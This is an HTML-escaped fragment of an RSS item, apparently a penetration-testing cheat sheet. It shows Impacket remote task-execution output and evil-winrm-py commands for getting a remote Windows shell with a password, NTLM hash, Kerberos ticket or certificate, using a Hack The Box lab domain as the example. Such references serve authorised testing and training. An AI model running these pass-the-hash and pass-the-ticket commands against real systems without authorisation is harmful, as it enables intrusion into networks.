class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[!] This will work ONLY on Windows &amp;gt;= Vista&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Creating task \LCpKICMQ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Running task \LCpKICMQ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Deleting task \LCpKICMQ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Attempting to read ADMIN$\Temp\LCpKICMQ.tmp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;h3 id=&#34;evil-winrm-py&#34;&gt;evil-winrm-py&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab1&#34; &gt;Password&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab2&#34; &gt;NTLM&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab3&#34; &gt;Kerberos&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab4&#34; &gt;Cert&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab5&#34; &gt;SSL&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab2&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab3&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Step 1: Configure &lt;span class=&#34;s1&#34;&gt;&amp;#39;/etc/krb5.conf&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;All in UPPERCASE&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[libdefaults]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    default_realm = &amp;lt;DOMAIN&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[realms]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    &amp;lt;DOMAIN&amp;gt; = {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        kdc = &amp;lt;DC&amp;gt;:88&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        admin_server = &amp;lt;DC&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        default_domain = &amp;lt;DOMAIN&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[domain_realm]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    .domain.internal = &amp;lt;DOMAIN&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    domain.internal = &amp;lt;DOMAIN&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[libdefaults]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    default_realm = WINDCORP.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[realms]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    WINDCORP.HTB = {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        kdc = HOPE.WINDCORP.HTB:88&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        admin_server = HOPE.WINDCORP.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        default_domain = WINDCORP.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[domain_realm]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    .domain.internal = WINDCORP.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    domain.internal = WINDCORP.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Step 2: Request a ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getTGT &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Step 3: Pass-the-ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=&amp;lt;CCACHE&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;winrm_user.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Step 4: Connect&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --no-pass&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab4&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; --priv-key-pem &amp;lt;PRIV_KEY_PEM&amp;gt; --cert-pem &amp;lt;CERT_PEM&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set3&#34; data-tabcontent=&#34;tab5&#34;&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Port &lt;span class=&#34;m&#34;&gt;5986&lt;/span&gt; SSL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; evil-winrm-py -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --no-pass --ssl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
